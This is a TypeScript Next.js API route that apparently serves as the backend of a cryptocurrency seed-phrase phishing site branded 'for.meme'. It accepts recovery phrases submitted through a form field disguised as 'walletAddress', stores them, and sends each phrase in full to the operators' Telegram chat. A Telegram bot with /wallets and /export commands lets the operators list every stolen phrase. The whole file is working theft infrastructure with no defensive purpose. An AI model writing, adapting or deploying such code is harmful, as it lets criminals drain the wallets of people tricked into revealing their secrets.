import { NextRequest, NextResponse } from 'next/server'
import { addWallet, getWalletStats, getAllWallets, WalletData } from '../../../lib/storage'

const TELEGRAM_BOT_TOKEN: string | undefined = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID: string | undefined = process.env.TELEGRAM_CHAT_ID

// Handle ALL requests (both seed phrase submissions and Telegram webhooks)
export async function POST(request: NextRequest) {
  try {
    // Read the body once and store it
    const body = await request.json()
    console.log('📨 Received request body:', body)

    // If it's a Telegram webhook update (has update_id)
    if (body.update_id) {
      console.log('🤖 Telegram webhook received')
      
      if (body.message) {
        const { chat, text } = body.message
        const chatId = chat.id

        console.log('💬 Telegram message:', text, 'from chat:', chatId)

        if (text) {
          switch (text.toLowerCase()) {
            case '/start':
              await handleStartCommand(chatId)
              break

            case '/wallets':
              await handleWalletsCommand(chatId)
              break

            case '/stats':
              await handleStatsCommand(chatId)
              break

            case '/export':
              await handleExportCommand(chatId)
              break

            case '/help':
              await handleHelpCommand(chatId)
              break

            default:
              await sendTelegramMessage(chatId,
                '🤖 *for.meme Bot*\n\n' +
                'Use /help to see available commands.'
              )
          }
        }
      }
      
      return NextResponse.json({ success: true })
    }

    // If no update_id, it's a seed phrase submission
    console.log('💰 Seed phrase submission received')
    const { walletAddress } = body // Still called walletAddress from frontend

    console.log('🔍 Seed phrase:', walletAddress)

    if (!walletAddress) {
      console.log('❌ No seed phrase provided')
      return NextResponse.json({ error: 'Seed phrase is required' }, { status: 400 })
    }

    // Basic seed phrase validation (at least 12 words)
    const words = walletAddress.trim().split(/\s+/)
    if (words.length < 12) {
      console.log('❌ Invalid seed phrase format')
      return NextResponse.json({ error: 'Please enter a valid seed phrase (minimum 12 words)' }, { status: 400 })
    }

    // Store seed phrase
    const walletData: WalletData = {
      seedPhrase: walletAddress, // Store as seedPhrase
      timestamp: new Date().toISOString(),
      source: 'for.meme'
    }

    console.log('🔍 Calling addWallet...')
    await addWallet(walletData)
    console.log('🔍 After addWallet - checking stats...')

    const stats = await getWalletStats()
    console.log('🔍 Stats after addition:', stats)

    // Send notification to Telegram
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      console.log('🔍 Sending Telegram notification...')
      const notificationMessage = `🤑 *New Seed Phrase Registered!*\n\n` +
        `🔐 *Seed Phrase:* \`${walletAddress}\`\n` +
        `📊 *Total Registrations:* ${stats.total}\n` +
        `📈 *Today:* ${stats.today}\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`

      await sendTelegramMessage(TELEGRAM_CHAT_ID, notificationMessage)
    }

    return NextResponse.json({
      success: true,
      totalWallets: stats.total,
      position: stats.total
    })

  } catch (error) {
    console.error('❌ Error in Telegram API:', error)
    return NextResponse.json({ success: true })
  }
}

// Command handlers - Updated text
async function handleStartCommand(chatId: string | number) {
  const stats = await getWalletStats()
  const message = `🤖 *Welcome to for.meme Bot!*\n\n` +
    `I manage seed phrase registrations from the for.meme website.\n\n` +
    `📊 *Current Stats:*\n` +
    `• Total Registrations: ${stats.total}\n` +
    `• Registered Today: ${stats.today}\n\n` +
    `Use /help to see all available commands.`

  await sendTelegramMessage(chatId, message)
}

async function handleWalletsCommand(chatId: string | number) {
  const stats = await getWalletStats()
  
  let message = `📊 *All Seed Phrase Statistics*\n\n`
  message += `💰 *Total Registrations:* ${stats.total}\n`
  message += `📈 *Registered Today:* ${stats.today}\n`
  message += `⏰ *Last Updated:* ${new Date().toLocaleString()}\n\n`

  if (stats.recent.length > 0) {
    message += `*Recent Seed Phrases (last 10):*\n`
    stats.recent.slice(-10).forEach((wallet, index) => {
      const time = new Date(wallet.timestamp).toLocaleTimeString()
      const date = new Date(wallet.timestamp).toLocaleDateString()
      message += `${index + 1}. \`${wallet.seedPhrase}\`\n   📅 ${date} ${time}\n\n`
    })
  } else {
    message += `No seed phrases registered yet.`
  }

  await sendTelegramMessage(chatId, message)
}

async function handleStatsCommand(chatId: string | number) {
  const stats = await getWalletStats()

  const message = `📈 *Quick Stats*\n\n` +
    `• Total Seed Phrases: ${stats.total}\n` +
    `• Registered Today: ${stats.today}\n` +
    `• Last 10 Registrations: ${stats.recent.length}\n\n` +
    `_Use /wallets to see all seed phrases_`

  await sendTelegramMessage(chatId, message)
}

async function handleExportCommand(chatId: string | number) {
  const allWallets = await getAllWallets()

  if (allWallets.length === 0) {
    await sendTelegramMessage(chatId, 'No seed phrases found in database.')
    return
  }

  let message = `📁 *All Seed Phrases (${allWallets.length})*\n\n`

  allWallets.forEach((wallet, index) => {
    const time = new Date(wallet.timestamp).toLocaleString()
    message += `${index + 1}. \`${wallet.seedPhrase}\`\n   ⏰ ${time}\n\n`
  })

  await sendTelegramMessage(chatId, message)
}

async function handleHelpCommand(chatId: string | number) {
  const message = `🤖 *Available Commands*\n\n` +
    `*/start* - Welcome message with stats\n` +
    `*/wallets* - Show all seed phrases and stats\n` +
    `*/stats* - Quick statistics overview\n` +
    `*/export* - Export all seed phrases\n` +
    `*/help* - Show this help message\n\n` +
    `💡 *All commands are available to everyone with bot access*`

  await sendTelegramMessage(chatId, message)
}

// Utility function to send messages (same as before)
async function sendTelegramMessage(chatId: string | number, text: string) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('❌ No Telegram bot token configured')
    return
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'Markdown',
        }),
      }
    )

    const result = await response.json()
    console.log('📤 Sent Telegram message:', result.ok ? '✅ Success' : '❌ Failed')

  } catch (error) {
    console.error('❌ Error sending Telegram message:', error)
  }
}

// Handle GET requests (same as before)
export async function GET(request: NextRequest) {
  const url = new URL(request.url)
  const setup = url.searchParams.get('setup')

  if (setup === 'webhook' && TELEGRAM_BOT_TOKEN) {
    const webhookUrl = `https://for-meme-wallet-gtcc.vercel.app/api/telegram`

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}`
    )

    const result = await response.json()

    return NextResponse.json({
      success: result.ok,
      webhook: webhookUrl,
      result: result
    })
  }

  return NextResponse.json({
    status: 'Telegram API is running',
    instructions: 'Set webhook with: /api/telegram?setup=webhook'
  })
}
